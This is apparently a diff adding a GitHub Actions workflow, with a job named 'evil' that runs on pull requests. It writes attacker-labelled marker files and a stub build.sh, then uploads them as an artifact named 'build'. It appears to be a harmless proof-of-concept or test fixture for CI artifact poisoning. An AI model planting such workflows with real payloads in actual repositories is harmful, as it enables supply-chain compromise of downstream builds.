@@ -1,0 +1,17 @@
+name: CI
+on:
+  pull_request
+jobs:
+  evil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          mkdir -p dist
+          echo "ATTACKER-BUILD run=${GITHUB_RUN_ID} repo=${GITHUB_REPOSITORY}" > dist/build.txt
+          echo "ATTACKER-SIDECAR run=${GITHUB_RUN_ID}" > dist/sidecar.txt
+          echo "ATTACKER-MARKER run=${GITHUB_RUN_ID}" > dist/marker.txt
+          echo 'echo ATTACKER-CODE-RAN' > dist/build.sh
+      - uses: actions/upload-artifact@v4
+        with:
+          name: build
+          path: dist
